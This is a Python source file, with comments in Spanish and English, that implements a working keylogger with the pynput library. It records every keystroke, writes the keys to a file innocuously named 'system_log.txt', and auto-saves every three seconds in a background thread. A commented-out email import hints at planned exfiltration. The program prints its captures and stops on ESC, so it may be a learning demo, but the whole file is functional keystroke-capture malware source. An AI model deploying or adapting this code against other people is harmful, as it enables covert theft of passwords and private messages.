# -*- coding: utf-8 -*-
import os
import time
import sys
# ELIMINAR estas líneas:
# import smtplib
# from email.mime.text import MimeText
from pynput import keyboard
from datetime import datetime
import threading

# Configurar codificación UTF-8 para Windows
if sys.platform == "win32":
    import codecs
    sys.stdout = codecs.getwriter("utf-8")(sys.stdout.detach())
    sys.stderr = codecs.getwriter("utf-8")(sys.stderr.detach())

class Keylogger:
    def __init__(self):
        self.log_file = "system_log.txt"
        self.buffer = ""
        self.buffer_size = 5  # Smaller buffer for more responsive updates
        self.is_running = True
        self.key_count = 0
        self.word_count = 0
        print("Keylogger INICIALIZADO correctamente")
        
    def on_press(self, key):
        try:
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            if hasattr(key, 'char') and key.char is not None:
                key_data = key.char
                self.key_count += 1
            else:
                special_keys = {
                    keyboard.Key.space: ' ',
                    keyboard.Key.enter: '\n',
                    keyboard.Key.tab: '\t',
                    keyboard.Key.backspace: '[BACKSPACE]',
                    keyboard.Key.shift: '[SHIFT]',
                    keyboard.Key.ctrl: '[CTRL]',
                    keyboard.Key.alt: '[ALT]'
                }
                key_data = special_keys.get(key, f"[{key.name.upper()}]")
                self.key_count += 1
            
            # Contar palabras (espacios + 1)
            if key_data == ' ':
                self.word_count += 1
            
            self.buffer += key_data
            
            # Imprimir retroalimentación en tiempo real
            print(f"[{timestamp}] {key_data} (Keys: {self.key_count}, Words: {self.word_count})")
            
            # Guardar más frecuentemente para actualizaciones en tiempo real
            if len(self.buffer) >= self.buffer_size:
                self.save_buffer()
                
        except Exception as e:
            print(f"Error: {e}")
    
    def on_release(self, key):
        if key == keyboard.Key.esc:
            self.stop()
            return False
    
    def save_buffer(self):
        if self.buffer:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(self.buffer)
            print(f"Buffer guardado: '{self.buffer}' (Total: {self.key_count} keys, {self.word_count} words)")
            self.buffer = ""
    
    def stop(self):
        self.is_running = False
        self.save_buffer()
        print("\nKeylogger detenido")
    
    def start(self):
        print("Keylogger INICIADO...")
        print("Presiona ESC para detener")
        print("Las teclas se guardan en: system_log.txt")
        print("Inicia a escribir para ver la captura en tiempo real...")
        
        def auto_save():
            counter = 0
            while self.is_running:
                time.sleep(3)  # More frequent saves for real-time updates
                counter += 1
                self.save_buffer()
                print(f"Guardado automatico #{counter} (cada 3 segundos)")
        
        save_thread = threading.Thread(target=auto_save)
        save_thread.daemon = True
        save_thread.start()
        
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

if __name__ == "__main__":
    logger = Keylogger()
    try:
        logger.start()
    except KeyboardInterrupt:
        logger.stop()
